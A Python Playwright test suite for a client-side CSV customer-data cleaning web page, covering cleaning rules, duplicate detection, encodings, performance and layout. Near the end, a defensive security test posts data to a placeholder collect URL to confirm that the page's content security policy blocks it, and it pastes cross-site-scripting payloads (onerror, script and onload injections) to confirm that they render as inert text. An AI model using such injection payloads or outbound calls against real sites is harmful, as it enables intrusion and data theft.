# Headless tests for demo 1 against the shipped out/index.html.
import json, csv, io, time, random, sys, os, subprocess
from playwright.sync_api import sync_playwright

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXP = json.load(open(os.path.join(ROOT, "expected.json"), encoding="utf-8"))
COLS = EXP["columns"]
TYPE_OF = {"Name":"text","Email":"text","Street address":"text","City":"text","Province":"text","Phone":"phone","Postal code":"postal","Customer since":"date"}
CODE_OF = {"Missing required value":"missing","Not a valid 10-digit phone number":"phone_invalid","Not a valid Canadian postal code":"postal_invalid",
           "Could be day/month or month/day":"date_ambiguous","This date doesn't exist":"date_impossible", "Not a valid email address":"email_invalid"}
results = []
def check(name, cond, detail=""):
    results.append((name, bool(cond), detail))
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else "  :: " + str(detail)[:600]))

srv = subprocess.Popen([sys.executable, "-m", "http.server", "8099", "--bind", "127.0.0.1", "-d", os.path.join(ROOT, "out")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.8)
URL = "http://127.0.0.1:8099/index.html"

def read_csv_text(t):
    if t.startswith("\ufeff"): t = t[1:]
    return list(csv.reader(io.StringIO(t)))

def grab(page, btn):
    with page.expect_download() as d:
        page.click(btn)
    p = d.value.path()
    return read_csv_text(open(p, encoding="utf-8").read()), d.value.suggested_filename

errors = []
with sync_playwright() as pw:
    br = pw.chromium.launch(args=["--no-sandbox"])
    ctx = br.new_context(viewport={"width": 390, "height": 844}, device_scale_factor=2, accept_downloads=True)
    ctx.route("**/fonts.googleapis.com/**", lambda r: r.abort())
    ctx.route("**/fonts.gstatic.com/**", lambda r: r.abort())
    page = ctx.new_page()
    page.on("pageerror", lambda e: errors.append("pageerror: " + str(e)))
    page.on("console", lambda m: errors.append("console: " + m.text) if m.type == "error" and "fonts.g" not in m.text and "ERR_FAILED" not in m.text else None)
    page.goto(URL); page.wait_for_selector("#btn-sample")

    # ---- main run, default date setting
    page.click("#btn-sample"); page.click("#btn-clean")
    page.wait_for_selector("#step-results:not([hidden])")
    clean, fname = grab(page, "#dl-clean")
    check("clean CSV header unchanged", clean[0] == COLS, clean[0])
    check("clean CSV keeps all 60 rows (no silent merge)", len(clean) - 1 == 60, len(clean) - 1)
    mism = [(i + 2, COLS[c], clean[i + 1][c], EXP["clean"][i][c]) for i in range(60) for c in range(8) if clean[i + 1][c] != EXP["clean"][i][c]]
    check("every cleaned cell equals the planned value (480 cells)", not mism, mism[:8])

    log, _ = grab(page, "#dl-log")
    def cat(rule):
        if rule.startswith("Province"): return "province"
        if rule.startswith("Date"): return "date"
        return {"Phone format": "phone", "Postal code format": "postal"}.get(rule, "text")
    got_changes = sorted([[int(r[0]), r[1], cat(r[4])] for r in log[1:]])
    exp_changes = sorted(EXP["changes"])
    check("change log = exactly the 42 planted changes", got_changes == exp_changes,
          {"missing": [c for c in exp_changes if c not in got_changes], "extra": [c for c in got_changes if c not in exp_changes]})
    by = {}
    for c in got_changes: by[c[2]] = by.get(c[2], 0) + 1
    check("change counts 14 text / 9 phone / 6 postal / 10 date / 3 province", by == EXP["counts"]["changes"], by)
    before_after_ok = all(r[2] != r[3] for r in log[1:])
    check("every log entry has differing before and after", before_after_ok)

    iss, _ = grab(page, "#dl-issues")
    cell_issues = [r for r in iss[1:] if not r[3].startswith("Possible duplicate")]
    got_flags = sorted([[int(r[0]), r[1], CODE_OF.get(r[3], "?" + r[3])] for r in cell_issues])
    exp_flags = sorted(EXP["flags"])
    check("issues = exactly the 17 planted problems", got_flags == exp_flags,
          {"missing": [c for c in exp_flags if c not in got_flags], "extra": [c for c in got_flags if c not in exp_flags]})
    dup_issue_rows = sorted(int(r[0]) for r in iss[1:] if r[3].startswith("Possible duplicate"))
    check("undecided duplicates listed in issues CSV (7)", len(dup_issue_rows) == 7, dup_issue_rows)

    pairs = page.eval_on_selector_all(".pair", "els => els.map(e => [e.dataset.type, ...e.dataset.pair.split('-').map(Number)])")
    exp_pairs = [[t, a, b] for t, a, b in EXP["pairs"]]
    check("duplicate pairs = exactly 3 exact + 4 near as planted", sorted(pairs) == sorted(exp_pairs), {"got": pairs, "exp": exp_pairs})
    tr = EXP["traps"]
    flat = [set(p[1:]) for p in pairs]
    check("trap: Raman household (same address) not flagged", set(tr["raman"]) not in flat)
    check("trap: Smiths on same street not flagged", set(tr["smith"]) not in flat)
    check("trap: O'Brien and DeSouza not changed", not any(c[0] in (tr["obrien"], tr["desouza"]) for c in got_changes))
    summary = page.inner_text("#summary")
    check("summary numbers come from the data", "60 rows" in summary and "42 cells" in summary and "17 problems" in summary and "7 possible" in summary, summary)
    reasons = page.eval_on_selector_all(".pair .reason", "els => els.map(e => e.textContent)")
    check("every pair shows a reason", all(len(r) > 5 for r in reasons), reasons)
    page.screenshot(path=os.path.join(ROOT, "shots", "d1-390-results.png"), full_page=True)
    ov = page.evaluate("document.documentElement.scrollWidth - window.innerWidth")
    check("no sideways page scroll at 390px", ov <= 0, ov)

    # ---- merge, undo, keep both
    ca, cb = EXP["chen"]["rows"]; keep_name = EXP["chen"]["names"][str(ca)]; drop_name = EXP["chen"]["names"][str(cb)]
    page.click(f'[data-merge="{ca}-{cb}"]')
    clean2, _ = grab(page, "#dl-clean")
    rows2 = [r[0] for r in clean2[1:]]
    check(f"merge: clean file has 59 rows, keeps row {ca} ({keep_name}), drops row {cb} ({drop_name})", len(rows2) == 59 and drop_name not in rows2 and keep_name in rows2, len(rows2))
    log2, _ = grab(page, "#dl-log")
    mlog = [r for r in log2[1:] if "Dropped in merge" in r[4] or "Merged" in r[4] or "Filled from" in r[4]]
    check("merge is logged: whole-row entry plus dropped differing values", any(r[1] == "(whole row)" and r[0] == str(cb) for r in mlog) and any(r[1] == "Name" and r[2] == drop_name for r in mlog), mlog)
    page.click(f'[data-undo="{ca}-{cb}"]')
    clean3, _ = grab(page, "#dl-clean")
    check("undo restores 60 rows", len(clean3) - 1 == 60)
    ex = [p for p in EXP["pairs"] if p[0] == "exact"][0]; exk = f"{ex[1]}-{ex[2]}"
    page.click(f'[data-keep="{exk}"]')
    iss2, _ = grab(page, "#dl-issues")
    check("keep both removes that pair from open issues", sum(1 for r in iss2[1:] if r[3].startswith("Possible duplicate")) == 6)
    page.click(f'[data-undo="{exk}"]')

    # ---- date settings
    for mode, key in (("day", "day"), ("month", "month")):
        page.check(f'input[name="datemode"][value="{mode}"]'); page.click("#btn-clean")
        c, _ = grab(page, "#dl-clean")
        ok = all(c[int(r) - 1][7] == v[key] for r, v in EXP["ambiguous"].items())
        i2, _ = grab(page, "#dl-issues")
        amb = [r for r in i2[1:] if r[3] == "Could be day/month or month/day"]
        l2, _ = grab(page, "#dl-log")
        check(f"{mode}-first setting resolves the 3 ambiguous dates and logs 45 changes", ok and not amb and len(l2) - 1 == 45, (ok, len(amb), len(l2) - 1))
    page.check('input[name="datemode"][value="unsure"]')


    # ---- flow: taps from landing to results
    page.goto(URL); page.wait_for_selector("#btn-sample")
    taps = 0
    page.click("#btn-sample"); taps += 1
    page.click("#btn-clean"); taps += 1
    check("core task takes 2 taps: load sample, clean", page.is_visible("#step-results") and taps == 2)

    # ---- stale results notice
    page.click('[data-keep="' + exk + '"]')
    page.check('input[name="datemode"][value="day"]')
    st = page.inner_text("#stale") if page.is_visible("#stale") else ""
    check("changing a setting marks results out of date and warns about decisions", "out of date" in st and "1 duplicate decision" in st and page.inner_text("#btn-clean") == "Clean the data again", st)
    page.click("#btn-clean")
    check("cleaning again clears the notice", not page.is_visible("#stale") and page.inner_text("#btn-clean") == "Clean the data")
    page.check('input[name="datemode"][value="unsure"]'); page.click("#btn-clean")

    # ---- CSP present and outbound requests blocked
    csp = page.get_attribute('meta[http-equiv="Content-Security-Policy"]', "content") or ""
    check("CSP meta present with connect-src 'none' and a script hash (no unsafe-inline scripts)", "connect-src 'none'" in csp and "script-src 'sha256-" in csp and "script-src 'unsafe-inline'" not in csp, csp)
    net = ctx.new_page()
    net.goto(URL); net.wait_for_selector("#btn-sample")
    blocked = net.evaluate("""async () => { try { await fetch('https://example.com/collect', {method:'POST', body:'x'}); return 'sent'; } catch (e) { return 'blocked'; } }""")
    check("page cannot send data out (fetch blocked by CSP)", blocked == "blocked", blocked)
    net.close()


    # ---- files shaped like real exports (fixtures in /home/claude/fixtures)
    FX = "/home/claude/fixtures/"
    def load_file(name):
        if page.is_visible("#btn-reset"): page.click("#btn-reset")
        page.set_input_files("#file", FX + name)
        page.wait_for_selector(f"#load-status:has-text('{name}')")
        types = page.eval_on_selector_all("#map-body tr", "rs => rs.map(r => [r.querySelector('th').textContent, r.querySelector('select').value, r.querySelector('input').checked])")
        page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])")
        clean = rcsv_path(grab_path(page, "#dl-clean")); iss = rcsv_path(grab_path(page, "#dl-issues"))
        return {t[0]: (t[1], t[2]) for t in types}, clean, iss
    def grab_path(p, sel):
        with p.expect_download() as d: p.click(sel)
        return d.value.path()
    def rcsv_path(pth):
        t = open(pth, encoding="utf-8").read(); t = t[1:] if t.startswith("\ufeff") else t
        return list(csv.reader(io.StringIO(t)))
    m, clean, iss = load_file("customers-shopify-style.csv")
    exp_types = {"First Name": "name", "Last Name": "name", "Email": "email", "Accepts Email Marketing": "text", "Default Address Company": "text",
                 "Default Address Address1": "address", "Default Address City": "city", "Default Address Province Code": "province",
                 "Default Address Zip": "postal", "Default Address Phone": "phone", "Phone": "phone", "Accepts SMS Marketing": "text"}
    check("Shopify-style headers: every column gets the right type", all(m.get(k, ("?",))[0] == v for k, v in exp_types.items()), {k: m.get(k, ("?",))[0] for k, v in exp_types.items() if m.get(k, ("?",))[0] != v})
    check("Shopify-style: only the first name, email and phone columns are required", [k for k in m if m[k][1]] == ["First Name", "Email", "Default Address Phone"], [k for k in m if m[k][1]])
    h = clean[0]; col = lambda r, n: clean[r][h.index(n)]
    check("Shopify-style: OMAR HADDAD, KITCHENER, 'on', 519.555.0101 cleaned", col(2, "First Name") == "Omar" and col(2, "Default Address City") == "Kitchener" and col(2, "Default Address Province Code") == "ON" and col(2, "Default Address Phone") == "519-555-0101" and col(2, "Email") == "omar.haddad@example.org", clean[2])
    check("Shopify-style: 'Ontario' in a code column becomes ON; yes/no columns untouched", col(5, "Default Address Province Code") == "ON" and col(2, "Accepts Email Marketing") == "no")
    probs = {(r[0], r[1], r[3]) for r in iss[1:]}
    check("Shopify-style: phone in the second phone column is not 'missing'", not any(p[0] == "4" and p[2] == "Missing required value" for p in probs), probs)
    check("Shopify-style: bad email and bad postal code flagged", ("5", "Email", "Not a valid email address") in probs and ("6", "Default Address Zip", "Not a valid Canadian postal code") in probs, probs)
    check("Shopify-style: two rows with the same email listed as a possible duplicate", any("Possible duplicate of row 6" in r[3] and r[0] == "7" for r in iss[1:]), [r for r in iss if "duplicate" in r[3]])
    m, clean, iss = load_file("customers-older-shopify-style.csv")
    h = clean[0]
    check("older Shopify-style: Province column of names stays names ('NS' becomes 'Nova Scotia'), code column stays codes",
          [r[h.index("Province")] for r in clean[1:]] == ["Quebec", "Ontario", "Nova Scotia"] and [r[h.index("Province Code")] for r in clean[1:]] == ["QC", "ON", "NS"], [r[h.index("Province")] for r in clean[1:]])
    m, clean, iss = load_file("customers-windows-excel.csv")
    h = clean[0]
    exp3 = {"Nom": "name", "Courriel": "email", "Téléphone": "phone", "Adresse": "address", "Ville": "city", "Province": "province", "Code postal": "postal", "Client depuis": "date"}
    check("French headers from a Windows Excel file (semicolons, Windows-1252) get the right types", all(m.get(k, ("?",))[0] == v for k, v in exp3.items()), m)
    check("French: FRANÇOIS CÔTÉ recased, Québec and qc become QC", clean[2][0] == "François Côté" and [r[5] for r in clean[1:]] == ["QC", "QC", "QC"], clean[1:])
    check("French month names: '4 mars 2025', '1er février 2024', 'le 15 août 2023'", [r[7] for r in clean[1:]] == ["2025-03-04", "2024-02-01", "2023-08-15"], [r[7] for r in clean[1:]])
    if page.is_visible("#btn-reset"): page.click("#btn-reset")

    # ---- first screen: the main button is visible without scrolling on a small phone
    page.set_viewport_size({"width": 375, "height": 667}); page.goto(URL); page.wait_for_selector("#btn-sample")
    bottom = page.evaluate("document.getElementById('btn-sample').getBoundingClientRect().bottom")
    check("Load sample data is on the first screen at 375 x 667", bottom <= 667, bottom)
    sample_dl = rcsv_path(grab_path(page, "#dl-sample"))
    check("Download the sample file gives the 60-row sample", len(sample_dl) == 61 and sample_dl[0][0] == "Name")
    page.set_viewport_size({"width": 390, "height": 844})
    # ---- keyboard focus visible
    page.focus("#btn-sample"); page.keyboard.press("Tab"); page.keyboard.press("Shift+Tab")
    outline = page.evaluate("getComputedStyle(document.activeElement).outlineStyle + ' ' + getComputedStyle(document.activeElement).outlineWidth")
    check("keyboard focus shows a 3px outline", outline.startswith("solid 3px"), outline)

    # ---- edge cases through the paste box
    def paste(text):
        if page.is_visible("#btn-reset"): page.click("#btn-reset")
        page.evaluate("document.getElementById('paste-box').open = true")
        page.fill("#paste", text); page.click("#btn-paste")
        return page.inner_text("#load-error"), page.inner_text("#load-status"), page.inner_text("#load-info")
    e, s, i = paste("")
    check("empty input: clear error, no crash", "nothing to read" in e.lower(), e)
    e, s, i = paste("Name,Email,Phone\n")
    check("header only: clear error", "no customer rows" in e, e)
    e, s, i = paste('Name,Email,Phone\n"Ana Lee,ana@example.com,5195550100\nBo Kim,bo@example.com,5195550101\n')
    check("unclosed quote: error names the line", "Line 2" in e and "never closes" in e, e)
    e, s, i = paste('Name,Email,Phone\nAna Lee,ana@example.com\nBo Kim,bo@example.com,5195550101,extra,more\n"Cy, Jr.",cy@example.com,"519 555 0102"\n')
    ok_load = not e and "3 rows" in s and "5 columns" in s
    page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])")
    it = page.inner_text("#issues")
    check("ragged rows: loaded, extra values kept as new columns, both rows flagged", ok_load and "fewer values" in it and "more values" in it, (e, s, it[:300]))
    e, s, i = paste("Name\tEmail\tPhone\nAna Lee\tana@example.com\t(519) 555-0100\n")
    page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])")
    check("tab-separated paste (copied from Excel) works", "tabs" in s and "519-555-0100" in page.inner_text("#changes"), s)

    # ---- Windows-1252 file through the real file picker
    p1252 = "/tmp/cp1252.csv"
    open(p1252, "wb").write("Name,Email\nÉLODIE GAGNÉ,e@example.com\n".encode("cp1252"))
    if page.is_visible("#btn-reset"): page.click("#btn-reset")
    page.set_input_files("#file", p1252)
    page.wait_for_selector("#load-status:has-text('cp1252.csv')")
    page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])")
    check("Windows-1252 file decoded and recased (Élodie Gagné)", "Élodie Gagné" in page.inner_text("#changes") and "Windows-1252" in page.inner_text("#load-info"), page.inner_text("#load-info"))

    # ---- large file: 5,000 realistic rows with 25 planted exact duplicates
    random.seed(7)
    FIRST = ["Maya","Omar","Grace","Liam","Sofia","Yusuf","Nadia","Owen","Mei","Ravi","Tessa","Diego","Fiona","Adam","Sara","Kofi","Emily","Hana","Zoe","Caleb","Leila","Victor","Julia","Isaac","Aisha","Ben","Chloe","Mateo","Amara","Noah","Ines","Wei","Rachel","Ethan","Priya","Arjun","Karen","David","Lucas","Anna"]
    LAST = ["Patel","Haddad","Liu","Fraser","Rossi","Khan","Petrova","Clarke","Tanaka","Kapoor","Kaur","Morales","Walsh","Kowal","Lindberg","Asante","Harper","Sato","Laurent","Hughes","Nasser","Lindqvist","Novak","Mensah","Bello","Hofstetter","Dubois","Alvarez","Okeke","Martin","Carvalho","Zhang","Bauer","Brooks","Raman","Smith","DeSouza","Weber","Gagne","Nguyen","Fischer","Adeyemi","Moreau","Reid","Chen","Tremblay","Siddiqui","Kowalski","Okafor","Singh"]
    L1 = "ABCEGHJKLMNPRSTVXY"; L2 = "ABCEGHJKLMNPRSTVWXYZ"
    combos = random.sample([(f + " " + m + ".", l) for f in FIRST for m in "ABCDEFGHJKLMNPRSTW" for l in LAST], 4975)
    rows_big = []; used_postal = set()
    for k, (f, l) in enumerate(combos):
        while True:
            pc = random.choice(L1) + str(random.randint(0,9)) + random.choice(L2) + " " + str(random.randint(0,9)) + random.choice(L2) + str(random.randint(0,9))
            if pc not in used_postal: used_postal.add(pc); break
        ph = "519" + str(2000000 + k)
        fmt = random.choice([ph, "(%s) %s-%s" % (ph[:3], ph[3:6], ph[6:]), "%s.%s.%s" % (ph[:3], ph[3:6], ph[6:])])
        rows_big.append([random.choice([f + " " + l, (f + " " + l).upper()]), "%s.%s%d@example.com" % (f.split()[0].lower(), l.lower(), k), fmt, "%d King St W" % (k + 1), "Kitchener", "ON",
                         random.choice([pc, pc.lower().replace(" ", "")]), random.choice(["2024-03-15", "15/03/2024", "March 4, 2025"])])
    for k in range(25): rows_big.append(list(rows_big[k * 7]))
    big = io.StringIO(); w = csv.writer(big, lineterminator="\n"); w.writerow(COLS); w.writerows(rows_big)
    open("/tmp/big.csv", "w").write(big.getvalue())
    if page.is_visible("#btn-reset"): page.click("#btn-reset")
    t0 = time.time()
    page.set_input_files("#file", "/tmp/big.csv")
    page.wait_for_selector("#load-status:has-text('5000 rows')")
    t1 = time.time()
    page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])")
    t2 = time.time()
    print(f"      timing: load {t1-t0:.2f}s, clean and render {t2-t1:.2f}s")
    check("5,000 rows: clean and render under 3 seconds", t2 - t1 < 3, t2 - t1)
    summ = page.inner_text("#summary")
    check("5,000 rows: finds exactly the 25 planted duplicate pairs", "25 possible duplicate pairs" in summ, summ)
    page.click('[data-more="changes"]')
    check("5,000 rows: long tables capped with a note", "Showing the first 500" in page.inner_text("#changes"))
    bigclean, _ = grab(page, "#dl-clean")
    check("5,000 rows: clean CSV has all rows", len(bigclean) - 1 == 5000, len(bigclean) - 1)

    # ---- stress: 5,000 rows that are the same 60 people over and over
    base = EXP["clean"]
    st = io.StringIO(); w = csv.writer(st, lineterminator="\n"); w.writerow(COLS)
    for k in range(5000):
        r = list(base[k % 60]); r[1] = ("u%d." % k + r[1]) if r[1] else ""; w.writerow(r)
    open("/tmp/stress.csv", "w").write(st.getvalue())
    page.click("#btn-reset")
    page.set_input_files("#file", "/tmp/stress.csv")
    page.wait_for_selector("#load-status:has-text('5000 rows')")
    t1 = time.time(); page.click("#btn-clean"); page.wait_for_selector("#step-results:not([hidden])"); t2 = time.time()
    ncards = page.eval_on_selector_all(".pair", "e => e.length")
    print(f"      stress: {page.inner_text('#summary')} ({t2-t1:.2f}s)")
    check("stress file with heavy duplication stays usable: 50 cards shown, rest paged", ncards == 50 and page.is_visible("#more-pairs") and t2 - t1 < 5, (ncards, t2 - t1))
    page.click("#more-pairs")
    check("show more adds 50 cards", page.eval_on_selector_all(".pair", "e => e.length") == 100)


    # ---- script injection through file contents, with CSP bypassed (tests the escaping) and with CSP on
    payload = ('"<img src=x onerror=window.__pwned=1>",Email,Phone\n'
               '"<script>window.__pwned=2</script>",a@example.com,519-555-0100\n'
               '"\\"><svg onload=window.__pwned=3>",b@example.com,519-555-0101\n'
               '"x\' onmouseover=\'window.__pwned=4","<img src=x onerror=window.__pwned=5>",bad<b>phone\n'
               '"<img src=x onerror=window.__pwned=6>",a@example.com,519-555-0100\n')
    for bypass in (True, False):
        c2 = br.new_context(viewport={"width": 390, "height": 844}, bypass_csp=bypass)
        c2.route("**/fonts.g*/**", lambda r: r.abort())
        p2 = c2.new_page()
        p2.goto(URL); p2.wait_for_selector("#btn-sample")
        p2.evaluate("document.getElementById('paste-box').open = true")
        p2.fill("#paste", payload); p2.click("#btn-paste"); p2.click("#btn-clean")
        p2.wait_for_selector("#step-results:not([hidden])")
        if p2.is_visible("[data-merge]"): p2.click("[data-merge]")
        p2.hover("#changes"); p2.hover("#issues"); p2.wait_for_timeout(300)
        pwned = p2.evaluate("window.__pwned")
        shown = p2.inner_text("main")
        label = "CSP bypassed" if bypass else "CSP on"
        check(f"injection payloads render as text and never run ({label})", pwned is None and "<img src=x" in shown and "<script>" in shown, (pwned, shown[:200]))
        c2.close()

    # ---- desktop width
    page.set_viewport_size({"width": 1360, "height": 900})
    page.click("#btn-reset"); page.click("#btn-sample"); page.click("#btn-clean")
    page.wait_for_selector("#step-results:not([hidden])")
    page.screenshot(path=os.path.join(ROOT, "shots", "d1-1360-results.png"), full_page=True)
    cap = page.inner_text("#cellmap figcaption")
    check("desktop cell map uses the full width (50 rows per band)", "50 rows per band" in cap, cap)
    lbl = page.evaluate("Math.min(...[...document.querySelectorAll('#cellmap text')].map(e => e.getBoundingClientRect().height))")
    check("cell map labels render at 14px or larger", lbl >= 14, lbl)
    ov = page.evaluate("document.documentElement.scrollWidth - window.innerWidth")
    check("no sideways page scroll at 1360px", ov <= 0, ov)
    page.set_viewport_size({"width": 390, "height": 844})
    page.click("#btn-reset")
    page.evaluate("window.scrollTo(0,0)")
    page.screenshot(path=os.path.join(ROOT, "shots", "d1-390-start.png"))
    page.click("#btn-sample")
    page.locator("#step-map").screenshot(path=os.path.join(ROOT, "shots", "d1-390-columns.png"))
    page.click("#btn-clean")
    cap = page.inner_text("#cellmap figcaption")
    check("phone cell map fits the screen with no sideways scroll", "rows per band" in cap and page.evaluate("document.documentElement.scrollWidth - window.innerWidth") <= 0, cap)

    check("no console or page errors", not errors, errors)
    br.close()
srv.terminate()
failed = [r for r in results if not r[1]]
print(f"\n{len(results) - len(failed)}/{len(results)} passed")
